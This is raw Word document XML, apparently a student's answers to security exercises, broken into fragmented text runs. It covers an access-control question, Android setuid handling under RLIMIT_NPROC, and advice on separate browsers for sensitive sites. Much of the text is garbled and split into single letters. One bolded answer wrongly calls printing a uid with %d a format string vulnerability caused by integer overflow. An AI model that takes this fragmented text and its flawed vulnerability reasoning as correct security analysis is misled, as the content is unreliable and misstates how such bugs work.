        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00373362" w:rsidRPr="003737DD" w:rsidRDefault="003737DD" w:rsidP="003737DD">
      <w:pPr>
        <w:spacing w:before="11" w:line="252" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="266"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00373362" w:rsidRPr="003737DD">
          <w:footerReference w:type="default" r:id="rId7"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="900" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This code would not result in an access control violation because it is a single threaded environment and because </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>getFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> takes no input or have I/O. Even if the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>getFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> were able to buffer overflow the return, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>canAccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">filename) would have to return true for the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>fopen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to be called. Since it is stated </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>canAccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003737DD">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>filename) returns false, this would not occur.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="254" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="44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]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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On</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>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stage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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="-2"/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="1"/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="-2"/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="1"/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="-2"/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:w w:val="97"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="10"/>
          <w:w w:val="9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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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kes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="50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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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tage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act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A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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oid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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">imit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>RLIMIT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_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>NPROC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ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13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nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4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ocess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110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ids</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/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proofErr w:type="gramEnd"/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zy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pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ocess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ses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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr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to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ca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9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setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>: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err</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd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setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd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uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);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>if</w:t>
      </w:r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(err &lt; 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="1028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LOGW(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd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 xml:space="preserve">"cannot </w:t>
      </w:r>
      <w:proofErr w:type="spellStart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setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd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 xml:space="preserve">(%d) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart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errno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd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 xml:space="preserve">: %d", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart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uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd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errno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="8"/>
        <w:ind w:left="82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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="9" w:line="250" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="76"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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me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ll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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New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u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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s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w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>en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es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ceed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RLIMI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T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_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>NPROC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mit.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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H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does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co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>leave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An</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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oid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vi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v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l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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>le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att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ck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pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>gr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr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 xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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e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d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7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pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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t?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112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 xml:space="preserve">ow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</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="21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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="119"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ect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20"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="119"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>oble</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095026F" w:rsidRDefault="0095026F">
      <w:pPr>
        <w:spacing w:before="9" w:line="250" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="76"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0095026F" w:rsidRPr="00621703" w:rsidRDefault="0095026F">
      <w:pPr>
        <w:spacing w:before="9" w:line="250" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="76"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="0095026F" w:rsidRPr="00621703">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t>In this code</w:t>
      </w:r>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>setuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> function returns a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>value which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is checked to see if it is less than zero</w:t>
      </w:r>
      <w:r w:rsidR="00CB07B4" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for an error</w:t>
      </w:r>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. If there is an error, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is printed as an integer using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>%d</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. If the value of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> when converted to an integer </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> larger than the amount an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00621703" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> can hold, there would be a format string vulnerability for the integer overflow.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="18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]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7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xp</w:t>
      </w:r>
      <w:r>
        <w:rPr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ts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advise </w:t>
      </w:r>
      <w:proofErr w:type="gram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>
        <w:rPr>
          <w:spacing w:val="2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b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="119"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="90"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> one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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/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d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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web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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113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other</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
          <w:w w:val="1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vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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2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“se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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ve”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web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sites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u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e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b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n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr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web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sites.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x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
